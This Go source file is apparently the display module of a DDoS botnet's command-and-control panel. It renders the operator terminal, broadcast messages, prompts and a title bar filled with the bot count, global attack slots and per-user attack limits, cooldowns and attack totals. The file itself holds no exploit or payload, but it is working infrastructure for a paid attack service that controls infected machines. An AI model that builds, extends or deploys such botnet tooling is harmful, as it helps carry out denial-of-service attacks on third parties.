package masters

import (
	"bufio"
	"cnc/core/attacks"
	"cnc/core/database"
	"cnc/core/masters/sessions"
	"cnc/core/slaves"
	"cnc/core/utils"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
)

func (a *Admin) Print(data ...interface{}) {
	_, _ = a.conn.Write([]byte(fmt.Sprint(data...)))
}

func (a *Admin) Printf(format string, val ...any) {
	a.Print(fmt.Sprintf(format, val...))
}

func (a *Admin) Println(data ...interface{}) {
	a.Print(fmt.Sprint(data...) + "\r\n")
}

func (a *Admin) Clear() {
	a.Printf("\x1bc")
}

func (a *Admin) Close() {
	err := a.conn.Close()
	if err != nil {
		return
	}
}

var PreviousDistribution map[string]int

func SlotsCooldown(username string) {
	GlobalSlots++
	for _ = range time.Tick(time.Second * 60) {
		GlobalSlots--
		break
	}
}

func BroadcastMessage(message string) {
	for _, session := range sessions.Sessions {
		session.Println(fmt.Sprintf("\r\n\u001B[1;43m[ BROADCAST ]\x1b[0m %s", message))
	}
}

func Displayln(this *Admin, path string, username string) error {
	sleepDurations := map[string]time.Duration{
		"<<100>>":        100 * time.Millisecond,
		"<<200>>":        200 * time.Millisecond,
		"<<300>>":        300 * time.Millisecond,
		"<<400>>":        400 * time.Millisecond,
		"<<500>>":        500 * time.Millisecond,
		"<<600>>":        600 * time.Millisecond,
		"<<700>>":        700 * time.Millisecond,
		"<<800>>":        800 * time.Millisecond,
		"<<900>>":        900 * time.Millisecond,
		"<<1000>>":       1000 * time.Millisecond,
		"<<sleep(120)>>": 120 * time.Millisecond,
		"<<sleep(20)>>":  20 * time.Millisecond,
		"<<sleep(40)>>":  40 * time.Millisecond,
		"<<sleep(60)>>":  60 * time.Millisecond,
		"<<sleep(80)>>":  80 * time.Millisecond,
		"<<sleep(100)>>": 100 * time.Millisecond,
	}

	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {

		}
	}(file)

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		line := scanner.Text()
		for pattern, sleepDuration := range sleepDurations {
			if strings.Contains(line, pattern) {
				time.Sleep(sleepDuration)
				line = strings.ReplaceAll(line, pattern, "")
			}
		}

		maxtime, err := database.DatabaseConnection.Getint("maxtime", username)
		if err != nil {
			if username != "" {
				return err
			}
		}

		cooldown, err := database.DatabaseConnection.Getint("cooldown", username)
		if err != nil {
			if username != "" {
				return err
			}
		}
		maxattacks, err := database.DatabaseConnection.Getint("maxAttacks", username)
		if err != nil {
			if username != "" {
				return err
			}
		}

		totalattacks, err := database.DatabaseConnection.Getint("totalAttacks", username)
		if err != nil {
			if username != "" {
				return err
			}
		}

		timenow := time.Now().Format("3:04 PM")

		memoryInfo, err := mem.VirtualMemory()
		if err != nil {
			panic(err)
		}

		uptimeInfo, err := host.Uptime()
		if err != nil {
			panic(err)
		}

		uptimeDays := uptimeInfo / (60 * 60 * 24)
		uptimeHours := (uptimeInfo % (60 * 60 * 24)) / (60 * 60)

		line = strings.ReplaceAll(line, "<<$clear>>", "\033c")
		if username != "" {
			_, err = this.conn.Write([]byte(fmt.Sprintf("\u001B[0m%s\r\n", utils.ReplaceFromMap(line, map[string]string{
				"\\x1b":   "\x1b",
				"\\u001b": "\u001b",
				"\\033":   "\033",
				"\\r":     "\r",
				"\\n":     "\n",
				"\\a":     "\a",
				"\\b":     "\b",
				"\\t":     "\t",
				"\\v":     "\v",
				"\\f":     "\f",
				"\\007":   "\007",
				// user tfx
				"<<$user.username>>":     username,
				"<<$user.totalattacks>>": strconv.Itoa(totalattacks),
				"<<$user.maxattacks>>":   strconv.Itoa(maxattacks),
				//"<<$user.expiry>>":       strconv.Itoa(expiry),
				"<<$user.maxtime>>":  strconv.Itoa(maxtime),
				"<<$user.cooldown>>": strconv.Itoa(cooldown),

				// other tfx
				"<<$botcount>>":  strconv.Itoa(slaves.CL.Count()),
				"<<$ongoing>>":   strconv.Itoa(attacks.MaxGlobalSlots),
				"<<$maxglobal>>": strconv.Itoa(attacks.MaxGlobalSlots),

				// server tfx
				"<<$timestamp>>":           timenow,
				"<<$server.memory.used>>":  strconv.FormatUint(memoryInfo.Used/(1024*1024), 10),
				"<<$server.memory.total>>": strconv.FormatUint(memoryInfo.Total/(1024*1024), 10),
				"<<$server.uptime>>":       fmt.Sprintf("%d days, %d hours", uptimeDays, uptimeHours),
			}))))
			if err != nil {
				return err
			}
		} else {
			_, err = this.conn.Write([]byte(fmt.Sprintf("\u001B[0m%s\r\n", utils.ReplaceFromMap(line, map[string]string{
				"\\x1b":   "\x1b",
				"\\u001b": "\u001b",
				"\\033":   "\033",
				"\\r":     "\r",
				"\\n":     "\n",
				"\\a":     "\a",
				"\\b":     "\b",
				"\\t":     "\t",
				"\\v":     "\v",
				"\\f":     "\f",
				"\\007":   "\007",

				// other tfx
				"<<$botcount>>":  strconv.Itoa(slaves.CL.Count()),
				"<<$ongoing>>":   strconv.Itoa(GlobalSlots),
				"<<$maxglobal>>": strconv.Itoa(attacks.MaxGlobalSlots),

				// server tfx
				"<<$timenow>>":             timenow,
				"<<$server.uptime>>":       strconv.FormatUint(uptimeInfo, 10),
				"<<$server.memory.used>>":  strconv.FormatUint(memoryInfo.Used, 10),
				"<<$server.memory.total>>": strconv.FormatUint(memoryInfo.Total, 10),
			}))))
			if err != nil {
				return err
			}
		}
	}
	return nil
}

func Displayf(this *Admin, path string, username string) error {
	sleepDurations := map[string]time.Duration{
		"<<100>>":        100 * time.Millisecond,
		"<<200>>":        200 * time.Millisecond,
		"<<300>>":        300 * time.Millisecond,
		"<<400>>":        400 * time.Millisecond,
		"<<500>>":        500 * time.Millisecond,
		"<<600>>":        600 * time.Millisecond,
		"<<700>>":        700 * time.Millisecond,
		"<<800>>":        800 * time.Millisecond,
		"<<900>>":        900 * time.Millisecond,
		"<<1000>>":       1000 * time.Millisecond,
		"<<sleep(120)>>": 120 * time.Millisecond,
		"<<sleep(20)>>":  20 * time.Millisecond,
		"<<sleep(40)>>":  40 * time.Millisecond,
		"<<sleep(60)>>":  60 * time.Millisecond,
		"<<sleep(80)>>":  80 * time.Millisecond,
		"<<sleep(100)>>": 100 * time.Millisecond,
	}

	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {

		}
	}(file)

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		line := scanner.Text()
		for pattern, sleepDuration := range sleepDurations {
			if strings.Contains(line, pattern) {
				time.Sleep(sleepDuration)
				line = strings.ReplaceAll(line, pattern, "")
			}
		}

		maxtime, err := database.DatabaseConnection.Getint("maxtime", username)
		if err != nil {
			if username != "" {
				return err
			}
		}

		cooldown, err := database.DatabaseConnection.Getint("cooldown", username)
		if err != nil {
			if username != "" {
				return err
			}
		}
		maxattacks, err := database.DatabaseConnection.Getint("maxAttacks", username)
		if err != nil {
			if username != "" {
				return err
			}
		}

		totalattacks, err := database.DatabaseConnection.Getint("totalAttacks", username)
		if err != nil {
			if username != "" {
				return err
			}
		}

		timenow := time.Now().Format("3:04 PM")

		memoryInfo, err := mem.VirtualMemory()
		if err != nil {
			panic(err)
		}

		uptimeInfo, err := host.Uptime()
		if err != nil {
			panic(err)
		}

		uptimeDays := uptimeInfo / (60 * 60 * 24)
		uptimeHours := (uptimeInfo % (60 * 60 * 24)) / (60 * 60)

		line = strings.ReplaceAll(line, "<<$clear>>", "\033c")
		if username != "" {
			_, err = this.conn.Write([]byte(fmt.Sprintf("\u001B[0m%s", utils.ReplaceFromMap(line, map[string]string{
				"\\x1b":   "\x1b",
				"\\u001b": "\u001b",
				"\\033":   "\033",
				"\\r":     "\r",
				"\\n":     "\n",
				"\\a":     "\a",
				"\\b":     "\b",
				"\\t":     "\t",
				"\\v":     "\v",
				"\\f":     "\f",
				"\\007":   "\007",
				// user tfx
				"<<$user.username>>":     username,
				"<<$user.totalattacks>>": strconv.Itoa(totalattacks),
				"<<$user.maxattacks>>":   strconv.Itoa(maxattacks),
				//"<<$user.expiry>>":       strconv.Itoa(expiry),
				"<<$user.maxtime>>":  strconv.Itoa(maxtime),
				"<<$user.cooldown>>": strconv.Itoa(cooldown),

				// other tfx
				"<<$botcount>>":  strconv.Itoa(slaves.CL.Count()),
				"<<$ongoing>>":   strconv.Itoa(attacks.MaxGlobalSlots),
				"<<$maxglobal>>": strconv.Itoa(attacks.MaxGlobalSlots),

				// server tfx
				"<<$timestamp>>":           timenow,
				"<<$server.memory.used>>":  strconv.FormatUint(memoryInfo.Used/(1024*1024), 10),
				"<<$server.memory.total>>": strconv.FormatUint(memoryInfo.Total/(1024*1024), 10),
				"<<$server.uptime>>":       fmt.Sprintf("%d days, %d hours", uptimeDays, uptimeHours),
			}))))
			if err != nil {
				return err
			}
		} else {
			_, err = this.conn.Write([]byte(fmt.Sprintf("\u001B[0m%s", utils.ReplaceFromMap(line, map[string]string{
				"\\x1b":   "\x1b",
				"\\u001b": "\u001b",
				"\\033":   "\033",
				"\\r":     "\r",
				"\\n":     "\n",
				"\\a":     "\a",
				"\\b":     "\b",
				"\\t":     "\t",
				"\\v":     "\v",
				"\\f":     "\f",
				"\\007":   "\007",

				// other tfx
				"<<$botcount>>":  strconv.Itoa(slaves.CL.Count()),
				"<<$ongoing>>":   strconv.Itoa(GlobalSlots),
				"<<$maxglobal>>": strconv.Itoa(attacks.MaxGlobalSlots),

				// server tfx
				"<<$timenow>>":             timenow,
				"<<$server.uptime>>":       strconv.FormatUint(uptimeInfo, 10),
				"<<$server.memory.used>>":  strconv.FormatUint(memoryInfo.Used, 10),
				"<<$server.memory.total>>": strconv.FormatUint(memoryInfo.Total, 10),
			}))))
			if err != nil {
				return err
			}
		}
	}
	return nil
}

func DisplayTitle(this *Admin, username string) error {
	titlePath := "assets/branding/user/title.txt"
	data, err := os.ReadFile(titlePath)
	if err != nil {
		return err
	}

	title := string(data)

	maxtime, err := database.DatabaseConnection.Getint("maxtime", username)
	if err != nil {
		return err
	}

	cooldown, err := database.DatabaseConnection.Getint("cooldown", username)
	if err != nil {
		return err
	}
	maxattacks, err := database.DatabaseConnection.Getint("maxAttacks", username)
	if err != nil {
		return err
	}

	totalattacks, err := database.DatabaseConnection.Getint("totalAttacks", username)
	if err != nil {
		return err
	}

	timenow := time.Now().Format("3:04 PM")

	memoryInfo, err := mem.VirtualMemory()
	if err != nil {
		panic(err)
	}

	uptimeInfo, err := host.Uptime()
	if err != nil {
		panic(err)
	}

	var botCount int
	botCount = slaves.CL.Count()

	uptimeDays := uptimeInfo / (60 * 60 * 24)
	uptimeHours := (uptimeInfo % (60 * 60 * 24)) / (60 * 60)

	title = utils.ReplaceFromMap(title, map[string]string{
		"\\x1b":   "\x1b",
		"\\u001b": "\u001b",
		"\\033":   "\033",
		"\\r":     "\r",
		"\\n":     "\n",
		"\\a":     "\a",
		"\\b":     "\b",
		"\\t":     "\t",
		"\\v":     "\v",
		"\\f":     "\f",
		"\\007":   "\007",

		// user tfx
		"<<$user.username>>":     username,
		"<<$user.totalattacks>>": strconv.Itoa(totalattacks),
		"<<$user.maxattacks>>":   strconv.Itoa(maxattacks),
		//"<<$user.expiry>>":       strconv.Itoa(expiry),
		"<<$user.maxtime>>":  strconv.Itoa(maxtime),
		"<<$user.cooldown>>": strconv.Itoa(cooldown),

		// other tfx
		"<<$botcount>>":  strconv.Itoa(botCount),
		"<<$ongoing>>":   strconv.Itoa(GlobalSlots),
		"<<$maxglobal>>": strconv.Itoa(attacks.MaxGlobalSlots),

		// server tfx
		"<<$timenow>>":             timenow,
		"<<$server.memory.used>>":  strconv.FormatUint(memoryInfo.Used/(1024*1024), 10),
		"<<$server.memory.total>>": strconv.FormatUint(memoryInfo.Total/(1024*1024), 10),
		"<<$server.uptime>>":       fmt.Sprintf("%d days, %d hours", uptimeDays, uptimeHours),
	})

	_, err = this.conn.Write([]byte(title))
	if err != nil {
		return err
	}

	return nil
}

func DisplayPrompt(username string) (string, error) {
	promptPath := "assets/branding/user/prompt.txt"
	data, err := os.ReadFile(promptPath)
	if err != nil {
		fmt.Println(err)
		return "", err
	}

	prompt := string(data)
	maxtime, err := database.DatabaseConnection.Getint("maxtime", username)
	if err != nil {
		return "", err
	}

	cooldown, err := database.DatabaseConnection.Getint("cooldown", username)
	if err != nil {
		return "", err
	}
	maxattacks, err := database.DatabaseConnection.Getint("maxAttacks", username)
	if err != nil {
		return "", err
	}

	totalattacks, err := database.DatabaseConnection.Getint("totalAttacks", username)
	if err != nil {
		return "", err
	}

	timenow := time.Now().Format("3:04 PM")

	memoryInfo, err := mem.VirtualMemory()
	if err != nil {
		fmt.Println(err)
	}

	uptimeInfo, err := host.Uptime()
	if err != nil {
		fmt.Println(err)
	}

	var botCount int
	botCount = slaves.CL.Count()

	uptimeDays := uptimeInfo / (60 * 60 * 24)
	uptimeHours := (uptimeInfo % (60 * 60 * 24)) / (60 * 60)

	prompt = utils.ReplaceFromMap(prompt, map[string]string{
		"\\x1b":   "\x1b",
		"\\u001b": "\u001b",
		"\\033":   "\033",
		"\\r":     "\r",
		"\\n":     "\n",
		"\\a":     "\a",
		"\\b":     "\b",
		"\\t":     "\t",
		"\\v":     "\v",
		"\\f":     "\f",
		"\\007":   "\007",

		// user tfx
		"<<$user.username>>":     username,
		"<<$user.totalattacks>>": strconv.Itoa(totalattacks),
		"<<$user.maxattacks>>":   strconv.Itoa(maxattacks),
		"<<$user.maxtime>>":      strconv.Itoa(maxtime),
		"<<$user.cooldown>>":     strconv.Itoa(cooldown),

		// other tfx
		"<<$botcount>>":  strconv.Itoa(botCount),
		"<<$ongoing>>":   strconv.Itoa(GlobalSlots),
		"<<$maxglobal>>": strconv.Itoa(attacks.MaxGlobalSlots),

		// server tfx
		"<<$timenow>>":             timenow,
		"<<$server.memory.used>>":  strconv.FormatUint(memoryInfo.Used/(1024*1024), 10),
		"<<$server.memory.total>>": strconv.FormatUint(memoryInfo.Total/(1024*1024), 10),
		"<<$server.uptime>>":       fmt.Sprintf("%d days, %d hours", uptimeDays, uptimeHours),
	})

	return prompt, nil
}
